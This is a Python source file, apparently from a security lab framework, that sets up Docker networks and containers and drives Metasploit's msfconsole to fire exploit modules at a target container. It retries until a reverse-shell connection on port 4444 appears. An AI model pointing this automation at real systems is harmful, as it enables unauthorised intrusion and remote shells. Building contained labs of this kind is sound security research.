import time

class BaseRunner:
    def __init__(self, docker_client, network_name="set_framework_net",
                 volume_name="set_logs", target_name="target",
                 msf_image="metasploitframework/metasploit-framework:6.2.33"):
        self.client=docker_client
        self.network=network_name
        self.volume=volume_name
        self.msf_image=msf_image
        self.target_name=target_name

    def network_setup(self):
        net = None
        networks = [i.name for i in self.client.networks.list()]
        if self.network in networks:
            net = self.client.networks.get(self.network)
        else:
            net = self.client.networks.create(self.network, driver="bridge")
        return net

    def volume_setup(self):
        vol = None
        vols = [i.name for i in self.client.volumes.list()]
        if self.volume in vols:
            vol = self.client.volumes.get(self.volume)
        else:
            vol = self.client.volumes.create(name=self.volume)
        return vol

    def target_setup(self):
        pass

    def target_cleanup(self):
        pass

    def tcpdump_setup(self):
        pass

    def tcpdump_cleanup(self):
        pass

    def attack_setup(self):
        #TODO: moigrate this over th the base class
        print("[*] Starting attack system for %s" % self.target_name)
        dk_attack = self.client.containers.run(self.msf_image,
                                 detach=True, name="%s-attack" % self.target_name,
                                 network=self.network, tty=True)
        self.attack=dk_attack

    def attack_cleanup(self):
        self.attack.stop()
        self.attack.remove()

    def setup_all(self):
        self.network_setup()
        self.volume_setup()
        self.target_setup()
        self.tcpdump_setup()
        self.attack_setup()

    def cleanup_all(self):
        self.target_cleanup()
        self.attack_cleanup()

    def exploit(self):
        cmd = "/usr/src/metasploit-framework/msfconsole"
        flag = "-x"
        args = """use %s; %s \
            set RHOSTS %s; \
            set LHOST %s; \
            set ForceExploit true; \
            set AutoCheck false; \
            set ExitOnSession false; \
            exploit"""
        #cant remember why the second arg is a blank string
        print("[*] Running exploit for %s" % self.target_name, end="", flush=True)
        args = args % (self.msf_exploit, self.msf_options, self.target_name, "%s-attack" % self.target_name)
        result = self.attack.exec_run(cmd=[cmd, flag, args], tty=True, detach=True)

    def exploit_success(self):
        cmd = "netstat |grep 4444 |grep ESTABLISHED"
        result = self.attack.exec_run(cmd=cmd, tty=True)
        cmd_result = str(result.output)
        print('.', end="", flush=True)
        for line in cmd_result.splitlines():
            if "4444" in str(line) and "ESTABLISHED" in str(line):
                print("\n[*] Exploit of %s success" % self.target_name)
                return True
        return False

    def exploit_until_success(self, status_delay=3, status_checks=7, tries=4):
        for i in range(tries):
            self.exploit()
            for i in range (status_checks):
                if self.exploit_success():
                    return True
                time.sleep(status_delay)
            print("\n", end="", flush=True)
        print("[!] Exploit failed or status unknown")
        return False

    def ready_to_exploit(self):
        pass
